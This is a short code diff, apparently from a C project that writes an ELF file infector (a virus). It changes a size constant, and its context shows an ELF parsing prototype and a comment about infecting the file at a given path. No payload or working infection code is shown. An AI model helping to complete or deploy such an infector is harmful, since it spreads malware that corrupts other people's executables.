@@ -14,7 +14,7 @@
 
 static bool		parsing(byte *file, elf_data *data);
 
-#define _START_SIZE	0x20
+#define _START_SIZE	0xb9
 
 //	Infects the file located at path
 //
